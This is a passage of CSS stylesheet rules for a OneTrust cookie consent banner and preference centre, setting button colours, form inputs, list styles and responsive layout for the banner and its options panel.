      #onetrust-banner-sdk .ot-sdk-button:hover,#onetrust-banner-sdk :not(.ot-leg-btn-container)>button:hover,#onetrust-banner-sdk input[type="submit"]:hover,#onetrust-banner-sdk input[type="reset"]:hover,#onetrust-banner-sdk input[type="button"]:hover,#onetrust-banner-sdk .ot-sdk-button:focus,#onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,#onetrust-banner-sdk input[type="submit"]:focus,#onetrust-banner-sdk input[type="reset"]:focus,#onetrust-banner-sdk input[type="button"]:focus,#onetrust-pc-sdk .ot-sdk-button:hover,#onetrust-pc-sdk :not(.ot-leg-btn-container)>button:hover,#onetrust-pc-sdk input[type="submit"]:hover,#onetrust-pc-sdk input[type="reset"]:hover,#onetrust-pc-sdk input[type="button"]:hover,#onetrust-pc-sdk .ot-sdk-button:focus,#onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,#onetrust-pc-sdk input[type="submit"]:focus,#onetrust-pc-sdk input[type="reset"]:focus,#onetrust-pc-sdk input[type="button"]:focus,#ot-sdk-cookie-policy .ot-sdk-button:hover,#ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:hover,#ot-sdk-cookie-policy input[type="submit"]:hover,#ot-sdk-cookie-policy input[type="reset"]:hover,#ot-sdk-cookie-policy input[type="button"]:hover,#ot-sdk-cookie-policy .ot-sdk-button:focus,#ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus,#ot-sdk-cookie-policy input[type="submit"]:focus,#ot-sdk-cookie-policy input[type="reset"]:focus,#ot-sdk-cookie-policy input[type="button"]:focus{
        color:#333;
        border-color:#888;
        outline:0;
        opacity:0.7}
      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,#onetrust-banner-sdk button.ot-sdk-button-primary,#onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary,#onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary,#onetrust-banner-sdk input[type="button"].ot-sdk-button-primary,#onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,#onetrust-pc-sdk button.ot-sdk-button-primary,#onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary,#onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary,#onetrust-pc-sdk input[type="button"].ot-sdk-button-primary,#ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,#ot-sdk-cookie-policy button.ot-sdk-button-primary,#ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary,#ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary,#ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary{
        color:#fff;
        background-color:#33c3f0;
        border-color:#33c3f0}
      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,#onetrust-banner-sdk button.ot-sdk-button-primary:hover,#onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:hover,#onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:hover,#onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:hover,#onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,#onetrust-banner-sdk button.ot-sdk-button-primary:focus,#onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:focus,#onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:focus,#onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:focus,#onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,#onetrust-pc-sdk button.ot-sdk-button-primary:hover,#onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:hover,#onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:hover,#onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:hover,#onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,#onetrust-pc-sdk button.ot-sdk-button-primary:focus,#onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:focus,#onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:focus,#onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:focus,#ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,#ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,#ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:hover,#ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:hover,#ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:hover,#ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,#ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,#ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:focus,#ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:focus,#ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:focus{
        color:#fff;
        background-color:#1eaedb;
        border-color:#1eaedb}
      #onetrust-banner-sdk input[type="email"],#onetrust-banner-sdk input[type="number"],#onetrust-banner-sdk input[type="search"],#onetrust-banner-sdk input[type="text"],#onetrust-banner-sdk input[type="tel"],#onetrust-banner-sdk input[type="url"],#onetrust-banner-sdk input[type="password"],#onetrust-banner-sdk textarea,#onetrust-banner-sdk select,#onetrust-pc-sdk input[type="email"],#onetrust-pc-sdk input[type="number"],#onetrust-pc-sdk input[type="search"],#onetrust-pc-sdk input[type="text"],#onetrust-pc-sdk input[type="tel"],#onetrust-pc-sdk input[type="url"],#onetrust-pc-sdk input[type="password"],#onetrust-pc-sdk textarea,#onetrust-pc-sdk select,#ot-sdk-cookie-policy input[type="email"],#ot-sdk-cookie-policy input[type="number"],#ot-sdk-cookie-policy input[type="search"],#ot-sdk-cookie-policy input[type="text"],#ot-sdk-cookie-policy input[type="tel"],#ot-sdk-cookie-policy input[type="url"],#ot-sdk-cookie-policy input[type="password"],#ot-sdk-cookie-policy textarea,#ot-sdk-cookie-policy select{
        height:38px;
        padding:6px 10px;
        background-color:#fff;
        border:1px solid #d1d1d1;
        border-radius:4px;
        box-shadow:none;
        box-sizing:border-box}
      #onetrust-banner-sdk input[type="email"],#onetrust-banner-sdk input[type="number"],#onetrust-banner-sdk input[type="search"],#onetrust-banner-sdk input[type="text"],#onetrust-banner-sdk input[type="tel"],#onetrust-banner-sdk input[type="url"],#onetrust-banner-sdk input[type="password"],#onetrust-banner-sdk textarea,#onetrust-pc-sdk input[type="email"],#onetrust-pc-sdk input[type="number"],#onetrust-pc-sdk input[type="search"],#onetrust-pc-sdk input[type="text"],#onetrust-pc-sdk input[type="tel"],#onetrust-pc-sdk input[type="url"],#onetrust-pc-sdk input[type="password"],#onetrust-pc-sdk textarea,#ot-sdk-cookie-policy input[type="email"],#ot-sdk-cookie-policy input[type="number"],#ot-sdk-cookie-policy input[type="search"],#ot-sdk-cookie-policy input[type="text"],#ot-sdk-cookie-policy input[type="tel"],#ot-sdk-cookie-policy input[type="url"],#ot-sdk-cookie-policy input[type="password"],#ot-sdk-cookie-policy textarea{
        -webkit-appearance:none;
        -moz-appearance:none;
        appearance:none}
      #onetrust-banner-sdk textarea,#onetrust-pc-sdk textarea,#ot-sdk-cookie-policy textarea{
        min-height:65px;
        padding-top:6px;
        padding-bottom:6px}
      #onetrust-banner-sdk input[type="email"]:focus,#onetrust-banner-sdk input[type="number"]:focus,#onetrust-banner-sdk input[type="search"]:focus,#onetrust-banner-sdk input[type="text"]:focus,#onetrust-banner-sdk input[type="tel"]:focus,#onetrust-banner-sdk input[type="url"]:focus,#onetrust-banner-sdk input[type="password"]:focus,#onetrust-banner-sdk textarea:focus,#onetrust-banner-sdk select:focus,#onetrust-pc-sdk input[type="email"]:focus,#onetrust-pc-sdk input[type="number"]:focus,#onetrust-pc-sdk input[type="search"]:focus,#onetrust-pc-sdk input[type="text"]:focus,#onetrust-pc-sdk input[type="tel"]:focus,#onetrust-pc-sdk input[type="url"]:focus,#onetrust-pc-sdk input[type="password"]:focus,#onetrust-pc-sdk textarea:focus,#onetrust-pc-sdk select:focus,#ot-sdk-cookie-policy input[type="email"]:focus,#ot-sdk-cookie-policy input[type="number"]:focus,#ot-sdk-cookie-policy input[type="search"]:focus,#ot-sdk-cookie-policy input[type="text"]:focus,#ot-sdk-cookie-policy input[type="tel"]:focus,#ot-sdk-cookie-policy input[type="url"]:focus,#ot-sdk-cookie-policy input[type="password"]:focus,#ot-sdk-cookie-policy textarea:focus,#ot-sdk-cookie-policy select:focus{
        border:1px solid #33c3f0;
        outline:0}
      #onetrust-banner-sdk label,#onetrust-banner-sdk legend,#onetrust-pc-sdk label,#onetrust-pc-sdk legend,#ot-sdk-cookie-policy label,#ot-sdk-cookie-policy legend{
        display:block;
        margin-bottom:0.5rem;
        font-weight:600}
      #onetrust-banner-sdk fieldset,#onetrust-pc-sdk fieldset,#ot-sdk-cookie-policy fieldset{
        padding:0;
        border-width:0}
      #onetrust-banner-sdk input[type="checkbox"],#onetrust-banner-sdk input[type="radio"],#onetrust-pc-sdk input[type="checkbox"],#onetrust-pc-sdk input[type="radio"],#ot-sdk-cookie-policy input[type="checkbox"],#ot-sdk-cookie-policy input[type="radio"]{
        display:inline}
      #onetrust-banner-sdk label>.label-body,#onetrust-pc-sdk label>.label-body,#ot-sdk-cookie-policy label>.label-body{
        display:inline-block;
        margin-left:0.5rem;
        font-weight:normal}
      #onetrust-banner-sdk ul,#onetrust-pc-sdk ul,#ot-sdk-cookie-policy ul{
        list-style:circle inside}
      #onetrust-banner-sdk ol,#onetrust-pc-sdk ol,#ot-sdk-cookie-policy ol{
        list-style:decimal inside}
      #onetrust-banner-sdk ol,#onetrust-banner-sdk ul,#onetrust-pc-sdk ol,#onetrust-pc-sdk ul,#ot-sdk-cookie-policy ol,#ot-sdk-cookie-policy ul{
        padding-left:0;
        margin-top:0}
      #onetrust-banner-sdk ul ul,#onetrust-banner-sdk ul ol,#onetrust-banner-sdk ol ol,#onetrust-banner-sdk ol ul,#onetrust-pc-sdk ul ul,#onetrust-pc-sdk ul ol,#onetrust-pc-sdk ol ol,#onetrust-pc-sdk ol ul,#ot-sdk-cookie-policy ul ul,#ot-sdk-cookie-policy ul ol,#ot-sdk-cookie-policy ol ol,#ot-sdk-cookie-policy ol ul{
        margin:1.5rem 0 1.5rem 3rem;
        font-size:90%}
      #onetrust-banner-sdk li,#onetrust-pc-sdk li,#ot-sdk-cookie-policy li{
        margin-bottom:1rem}
      #onetrust-banner-sdk code,#onetrust-pc-sdk code,#ot-sdk-cookie-policy code{
        padding:0.2rem 0.5rem;
        margin:0 0.2rem;
        font-size:90%;
        white-space:nowrap;
        background:#f1f1f1;
        border:1px solid #e1e1e1;
        border-radius:4px}
      #onetrust-banner-sdk pre>code,#onetrust-pc-sdk pre>code,#ot-sdk-cookie-policy pre>code{
        display:block;
        padding:1rem 1.5rem;
        white-space:pre}
      #onetrust-banner-sdk th,#onetrust-banner-sdk td,#onetrust-pc-sdk th,#onetrust-pc-sdk td,#ot-sdk-cookie-policy th,#ot-sdk-cookie-policy td{
        padding:12px 15px;
        text-align:left;
        border-bottom:1px solid #e1e1e1}
      #onetrust-banner-sdk .ot-sdk-u-full-width,#onetrust-pc-sdk .ot-sdk-u-full-width,#ot-sdk-cookie-policy .ot-sdk-u-full-width{
        width:100%;
        box-sizing:border-box}
      #onetrust-banner-sdk .ot-sdk-u-max-full-width,#onetrust-pc-sdk .ot-sdk-u-max-full-width,#ot-sdk-cookie-policy .ot-sdk-u-max-full-width{
        max-width:100%;
        box-sizing:border-box}
      #onetrust-banner-sdk .ot-sdk-u-pull-right,#onetrust-pc-sdk .ot-sdk-u-pull-right,#ot-sdk-cookie-policy .ot-sdk-u-pull-right{
        float:right}
      #onetrust-banner-sdk .ot-sdk-u-pull-left,#onetrust-pc-sdk .ot-sdk-u-pull-left,#ot-sdk-cookie-policy .ot-sdk-u-pull-left{
        float:left}
      #onetrust-banner-sdk hr,#onetrust-pc-sdk hr,#ot-sdk-cookie-policy hr{
        margin-top:3rem;
        margin-bottom:3.5rem;
        border-width:0;
        border-top:1px solid #e1e1e1}
      #onetrust-banner-sdk .ot-sdk-container:after,#onetrust-banner-sdk .ot-sdk-row:after,#onetrust-banner-sdk .ot-sdk-u-cf,#onetrust-pc-sdk .ot-sdk-container:after,#onetrust-pc-sdk .ot-sdk-row:after,#onetrust-pc-sdk .ot-sdk-u-cf,#ot-sdk-cookie-policy .ot-sdk-container:after,#ot-sdk-cookie-policy .ot-sdk-row:after,#ot-sdk-cookie-policy .ot-sdk-u-cf{
        content:"";
        display:table;
        clear:both}
      #onetrust-banner-sdk .ot-sdk-row,#onetrust-pc-sdk .ot-sdk-row,#ot-sdk-cookie-policy .ot-sdk-row{
        margin:0;
        max-width:none;
        display:block;
        margin:0}
      #onetrust-banner-sdk{
        box-shadow:0 0 18px rgba(0,0,0,.2)}
      #onetrust-banner-sdk.otFlat{
        position:fixed;
        z-index:2147483645;
        bottom:0;
        right:0;
        left:0;
        background-color:#fff;
        max-height:90%;
        overflow-x:hidden;
        overflow-y:auto}
      #onetrust-banner-sdk::-webkit-scrollbar{
        width:11px}
      #onetrust-banner-sdk::-webkit-scrollbar-thumb{
        border-radius:10px;
        background:#c1c1c1}
      #onetrust-banner-sdk{
        scrollbar-arrow-color:#c1c1c1;
        scrollbar-darkshadow-color:#c1c1c1;
        scrollbar-face-color:#c1c1c1;
        scrollbar-shadow-color:#c1c1c1}
      #onetrust-banner-sdk #onetrust-policy{
        margin:1.25em 0 .625em 2em;
        overflow:hidden}
      #onetrust-banner-sdk #onetrust-policy-title{
        font-size:1.2em;
        line-height:1.3;
        margin-bottom:10px}
      #onetrust-banner-sdk #onetrust-policy-text{
        clear:both;
        text-align:left;
        font-size:.88em;
        line-height:1.4}
      #onetrust-banner-sdk #onetrust-policy-text *{
        font-size:inherit;
        line-height:inherit}
      #onetrust-banner-sdk #onetrust-policy-text a{
        font-weight:bold;
        margin-left:5px}
      #onetrust-banner-sdk #onetrust-policy-title,#onetrust-banner-sdk #onetrust-policy-text{
        color:dimgray;
        float:left}
      #onetrust-banner-sdk #onetrust-button-group-parent{
        min-height:1px;
        text-align:center}
      #onetrust-banner-sdk #onetrust-button-group{
        display:inline-block}
      #onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{
        background-color:#68b631;
        color:#fff;
        border-color:#68b631;
        margin-right:1em;
        min-width:125px;
        height:auto;
        white-space:normal;
        word-break:break-word;
        word-wrap:break-word;
        padding:12px 10px;
        line-height:1.2;
        font-size:.813em;
        font-weight:600}
      #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link{
        background-color:#fff;
        border:none;
        color:#68b631;
        text-decoration:underline;
        padding-right:0}
      #onetrust-banner-sdk #onetrust-close-btn-container{
        text-align:center}
      #onetrust-banner-sdk .onetrust-close-btn-ui{
        width:.8em;
        height:18px;
        margin:50% 0 0 50%;
        border:none}
      #onetrust-banner-sdk .onetrust-close-btn-ui.onetrust-lg{
        top:50%;
        margin:auto;
        transform:translate(-50%, -50%);
        position:absolute;
        padding:0}
      #onetrust-banner-sdk .banner_logo{
        display:none}
      #onetrust-banner-sdk .ot-b-addl-desc{
        clear:both;
        float:left;
        display:block}
      #onetrust-banner-sdk #banner-options{
        float:left;
        display:table;
        margin-right:0;
        margin-left:1em;
        width:calc(100% - 1em)}
      #onetrust-banner-sdk #banner-options label{
        margin:0;
        display:inline-block}
      #onetrust-banner-sdk .banner-option{
        margin-bottom:12px;
        border:none;
        float:left;
        padding:0}
      #onetrust-banner-sdk .banner-option:not(:first-child){
        padding:0;
        border:none}
      #onetrust-banner-sdk .banner-option-input{
        position:absolute;
        cursor:pointer;
        width:auto;
        height:20px;
        opacity:0}
      #onetrust-banner-sdk .banner-option-header{
        margin-bottom:6px;
        cursor:pointer;
        display:inline-block}
      #onetrust-banner-sdk .banner-option-header :first-child{
        font-size:.82em;
        line-height:1.4;
        color:dimgray;
        font-weight:bold;
        float:left}
      #onetrust-banner-sdk .banner-option-header .ot-arrow-container{
        display:inline-block;
        border-top:6px solid transparent;
        border-bottom:6px solid transparent;
        border-left:6px solid dimgray;
        margin-left:10px;
        margin-top:2px}
      #onetrust-banner-sdk .banner-option-details{
        display:none;
        font-size:.83em;
        line-height:1.5;
        padding:10px 0px 5px 10px;
        margin-right:10px;
        height:0px}
      #onetrust-banner-sdk .banner-option-details *{
        font-size:inherit;
        line-height:inherit;
        color:dimgray}
      #onetrust-banner-sdk .ot-arrow-container,#onetrust-banner-sdk .banner-option-details{
        transition:all 300ms ease-in 0s;
        -webkit-transition:all 300ms ease-in 0s;
        -moz-transition:all 300ms ease-in 0s;
        -o-transition:all 300ms ease-in 0s}
      #onetrust-banner-sdk .banner-option-input:checked~label .banner-option-header .ot-arrow-container{
        transform:rotate(90deg)}
      #onetrust-banner-sdk .banner-option-input:checked~.banner-option-details{
        height:auto;
        display:block}
      #onetrust-banner-sdk .ot-dpd-container{
        float:left}
      #onetrust-banner-sdk .ot-dpd-title{
        margin-bottom:10px}
      #onetrust-banner-sdk .ot-dpd-title,#onetrust-banner-sdk .ot-dpd-desc{
        font-size:.88em;
        line-height:1.4;
        color:dimgray}
      #onetrust-banner-sdk .ot-dpd-title *,#onetrust-banner-sdk .ot-dpd-desc *{
        font-size:inherit;
        line-height:inherit}
      #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text *{
        margin-bottom:0}
      #onetrust-banner-sdk.ot-iab-2 .onetrust-vendors-list-handler{
        display:block;
        margin-left:0;
        margin-top:5px;
        clear:both}
      #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button{
        display:block}
      #onetrust-banner-sdk #onetrust-policy-text,#onetrust-banner-sdk .ot-dpd-desc,#onetrust-banner-sdk .ot-b-addl-desc{
        font-size:.813em;
        line-height:1.5}
      #onetrust-banner-sdk .ot-dpd-desc{
        margin-bottom:10px}
      #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc{
        margin-top:10px;
        margin-bottom:10px;
        font-size:1em}
      @media only screen and (max-width: 425px){
        #onetrust-banner-sdk #onetrust-policy{
          margin-left:0}
        #onetrust-banner-sdk .ot-hide-small{
          display:none}
        #onetrust-banner-sdk #onetrust-button-group{
          display:block}
        #onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{
          width:100%}
        #onetrust-banner-sdk .onetrust-close-btn-ui{
          margin:5px 0 0 0;
          float:right;
          padding:0}
        #onetrust-banner-sdk #onetrust-close-btn-container-mobile,#onetrust-banner-sdk #onetrust-policy-title{
          display:inline;
          float:none}
        #onetrust-banner-sdk #banner-options{
          margin:0;
          padding:0;
          width:100%}
      }
      @media only screen and (min-width: 426px)and (max-width: 896px){
        #onetrust-banner-sdk #onetrust-policy{
          margin-left:1em;
          margin-right:1em}
        #onetrust-banner-sdk .onetrust-close-btn-ui.onetrust-lg{
          top:25%;
          right:2%}
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container{
          width:95%}
        #onetrust-banner-sdk.ot-iab-2 #onetrust-group-container{
          width:100%}
        #onetrust-banner-sdk #onetrust-button-group-parent{
          width:100%;
          position:relative;
          margin-left:0}
        #onetrust-banner-sdk .ot-hide-large{
          display:none}
        #onetrust-banner-sdk #onetrust-button-group button{
          display:inline-block}
        #onetrust-banner-sdk #onetrust-button-group{
          margin-right:0;
          text-align:center}
        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler{
          float:left}
        #onetrust-banner-sdk .has-reject-all-button #onetrust-reject-all-handler,#onetrust-banner-sdk .has-reject-all-button #onetrust-accept-btn-handler{
          float:right}
        #onetrust-banner-sdk .has-reject-all-button #onetrust-button-group{
          width:calc(100% - 2em);
          margin-right:0}
        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link{
          padding-left:0px;
          text-align:left}
        #onetrust-banner-sdk.ot-buttons-fw .ot-sdk-three button{
          width:100%;
          text-align:center}
        #onetrust-banner-sdk.ot-buttons-fw #onetrust-button-group-parent button{
          float:none}
        #onetrust-banner-sdk.ot-buttons-fw #onetrust-pc-btn-handler.cookie-setting-link{
          text-align:center}
      }
      @media only screen and (min-width: 550px){
        #onetrust-banner-sdk .banner-option:not(:first-child){
          border-left:1px solid #d8d8d8;
          padding-left:25px}
      }
      @media only screen and (min-width: 425px)and (max-width: 550px){
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group,#onetrust-banner-sdk.ot-iab-2 #onetrust-policy,#onetrust-banner-sdk.ot-iab-2 .banner-option{
          width:100%}
      }
      @media only screen and (min-width: 769px){
        #onetrust-banner-sdk .ot-hide-large{
          display:none}
        #onetrust-banner-sdk #onetrust-button-group{
          margin-right:30%}
        #onetrust-banner-sdk #banner-options{
          margin-left:2em;
          margin-right:5em;
          margin-bottom:1.25em;
          width:calc(100% - 7em)}
        #onetrust-banner-sdk .banner-option{
          float:none;
          display:table-cell}
      }
      @media only screen and (min-width: 1024px){
        #onetrust-banner-sdk #onetrust-policy{
          margin-left:2em}
        #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent{
          position:absolute;
          top:50%;
          left:60%;
          transform:translateY(-50%)}
        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-title{
          width:50%}
        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text,#onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc{
          margin-bottom:1em;
          width:50%;
          border-right:1px solid #d8d8d8;
          padding-right:1rem}
        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text{
          margin-bottom:0;
          padding-bottom:1em}
        #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc{
          margin-bottom:0;
          padding-bottom:1em}
        #onetrust-banner-sdk.ot-iab-2 .ot-dpd-container{
          width:45%;
          padding-left:1rem;
          display:inline-block;
          float:none}
        #onetrust-banner-sdk.ot-iab-2 .ot-dpd-title{
          line-height:1.7}
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group-parent{
          left:auto;
          right:4%;
          margin-left:0}
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button{
          display:block}
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent{
          margin:auto;
          width:36%}
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container{
          width:60%}
        #onetrust-banner-sdk #onetrust-button-group{
          margin-right:auto}
        #onetrust-banner-sdk #onetrust-close-btn-container{
          float:right}
        #onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{
          margin-top:1em}
      }
      @media only screen and (min-width: 890px){
        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group-parent{
          padding-left:4%;
          margin-left:0}
        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group{
          margin-right:0;
          margin-top:1.25em;
          width:100%}
        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button{
          width:100%;
          margin-bottom:5px;
          margin-top:5px}
        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button:last-of-type{
          margin-bottom:20px}
      }
      @media only screen and (min-width: 1280px){
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container{
          width:55%}
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent{
          width:44%;
          padding-left:2%;
          padding-right:2%}
        #onetrust-banner-sdk:not(.ot-iab-2).vertical-align-content #onetrust-button-group-parent{
          position:absolute;
          left:55%}
      }
      #onetrust-consent-sdk #onetrust-banner-sdk {
        background-color: #FFFFFF;
      }
      #onetrust-consent-sdk #onetrust-policy-title,
      #onetrust-consent-sdk #onetrust-policy-text,
      #onetrust-consent-sdk .ot-b-addl-desc,
      #onetrust-consent-sdk .ot-dpd-desc,
      #onetrust-consent-sdk .ot-dpd-title,
      #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
      #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
      #onetrust-consent-sdk #onetrust-banner-sdk #banner-options * {
        color: #333333;
      }
      #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
        background-color: #E9E9E9;
      }
      #onetrust-consent-sdk #onetrust-accept-btn-handler,
      #onetrust-banner-sdk #onetrust-reject-all-handler {
        background-color: #e50914;
        border-color: #e50914;
        color: #FFFFFF;
      }
      #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
        border-color: #FFFFFF;
        background-color: #FFFFFF;
        color: #e50914
      }
      #onetrust-consent-sdk #onetrust-pc-btn-handler {
        color: #6CC04A;
        border-color: #6CC04A;
        background-color: #FFFFFF;
      }
      #onetrust-consent-sdk a {
        color: #333 !important;
        font-weight: bold !important;
        text-decoration: none !important;
        font-size: inherit !important;
      }
      #onetrust-consent-sdk a:hover {
        text-decoration: underline !important;
      }
      #onetrust-consent-sdk *[data-optanongroupid=C0001] .ot-toggle-group .ot-always-active,
      #onetrust-consent-sdk *[data-optanongroupid=C0002] .ot-toggle-group .ot-always-active 
      {
        visibility: hidden;
        pointer-events: none;
      }
      #onetrust-pc-sdk #select-all-container {
        display: none;
      }
      #onetrust-consent-sdk *[data-optanongroupid=C0002] .category-host-list-btn,
      #onetrust-consent-sdk *[data-optanongroupid*=C0001] .category-host-list-btn {
        display: none !important;
      }
      #onetrust-pc-sdk.otPcTab{
        position:fixed;
        width:730px;
        max-width:730px;
        height:580px;
        left:0;
        right:0;
        top:0;
        bottom:0;
        margin:auto;
        font-size:16px;
        z-index:2147483647;
        border:1px solid #d7d7d7;
        border-radius:2px;
        background-color:#fff;
        box-shadow:0 2px 4px 0 rgba(0,0,0,0),0 7px 14px 0 rgba(50,50,93,.1)}
      #onetrust-pc-sdk *,#onetrust-pc-sdk ::after,#onetrust-pc-sdk ::before{
        box-sizing:content-box}
      #onetrust-pc-sdk #ot-content{
        height:calc(100% - 196px)}
      #onetrust-pc-sdk .ot-main-content{
        height:100%}
      #onetrust-pc-sdk .privacy-notice-link{
        text-decoration:underline}
      #onetrust-pc-sdk .privacy-notice-link:focus{
        outline:1px solid #63a3f8}
      #onetrust-pc-sdk li{
        list-style:none}
      #onetrust-pc-sdk ul,#onetrust-pc-sdk li{
        margin:0}
      #onetrust-pc-sdk a{
        text-decoration:none}
      #onetrust-pc-sdk .pc-content::-webkit-scrollbar,#onetrust-pc-sdk .groups-container::-webkit-scrollbar,#onetrust-pc-sdk #vendor-list-content::-webkit-scrollbar,#onetrust-pc-sdk .vendor-content::-webkit-scrollbar,#onetrust-pc-sdk #ot-filter-modal .ot-group-options::-webkit-scrollbar{
        width:11px}
      #onetrust-pc-sdk .pc-content::-webkit-scrollbar-thumb,#onetrust-pc-sdk .groups-container::-webkit-scrollbar-thumb,#onetrust-pc-sdk #vendor-list-content::-webkit-scrollbar-thumb,#onetrust-pc-sdk .vendor-content::-webkit-scrollbar-thumb,#onetrust-pc-sdk #ot-filter-modal .ot-group-options::-webkit-scrollbar-thumb{
        border-radius:10px;
        background:#c1c1c1}
      #onetrust-pc-sdk .pc-content,#onetrust-pc-sdk .groups-container,#onetrust-pc-sdk #vendor-list-content,#onetrust-pc-sdk .vendor-content,#onetrust-pc-sdk #ot-filter-modal .ot-group-options{
        scrollbar-arrow-color:#c1c1c1;
        scrollbar-darkshadow-color:#c1c1c1;
        scrollbar-face-color:#c1c1c1;
        scrollbar-shadow-color:#c1c1c1}
      #onetrust-pc-sdk .pc-header{
        height:auto;
        padding:20px;
        display:inline-block;
        vertical-align:middle;
        width:calc(100% - 40px);
        border-bottom:1px solid #d8d8d8}
      #onetrust-pc-sdk .pc-logo-container{
        float:left}
      #onetrust-pc-sdk .pc-title-container{
        float:right;
        width:calc(100% - 190px);
        margin-left:10px}
      #onetrust-pc-sdk .ot-always-active{
        font-size:1em;
        line-height:1.3;
        color:#3860be}
      #onetrust-pc-sdk .pc-close-btn-container{
        float:right;
        position:absolute;
        right:15px;
        margin-top:18px}
      #onetrust-pc-sdk .pc-content{
        position:relative;
        height:100%;
        overflow-y:auto;
        overflow-x:hidden}
      #onetrust-pc-sdk .groups-container{
        height:100%;
        overflow-y:auto}
      #onetrust-pc-sdk .group{
        cursor:pointer;
        border-left:10px solid transparent;
        background-color:#f4f4f4;
        border-bottom:1px solid #d7d7d7;
        padding-top:16px;
        padding-right:5px;
        padding-bottom:16px;
        padding-left:12px}
      #onetrust-pc-sdk .group h3{
        float:left;
        text-align:left;
        margin:0;
        color:dimgray;
        line-height:1.4;
        font-size:1em;
        word-break:break-word;
        word-wrap:break-word}
      #onetrust-pc-sdk .active-group{
        border-left:10px solid #68b631;
        background-color:#fff;
        border-bottom:none;
        position:relative}
      #onetrust-pc-sdk .active-group h3{
        color:#263238;
        font-weight:bold}
      #onetrust-pc-sdk .description-container{
        word-break:break-word;
        word-wrap:break-word;
        padding-top:20px;
        padding-right:16px;
        padding-bottom:15px;
        position:absolute;
        left:30%}
      #onetrust-pc-sdk .group-description{
        word-break:break-word;
        word-wrap:break-word;
        text-align:left;
        font-size:.82em;
        line-height:1.3;
        margin:0}
      #onetrust-pc-sdk #pc-policy-text{
        clear:both;
        float:left}
      #onetrust-pc-sdk #pc-policy-text a{
        color:#3860be;
        cursor:pointer;
        font-size:1em}
      #onetrust-pc-sdk #pc-policy-text a:hover{
        color:#1883fd}
      #onetrust-pc-sdk #pc-policy-text *{
        font-size:inherit}
      #onetrust-pc-sdk #pc-policy-text ul li{
        padding:10px 0px;
        border-bottom:1px solid #e2e2e2}
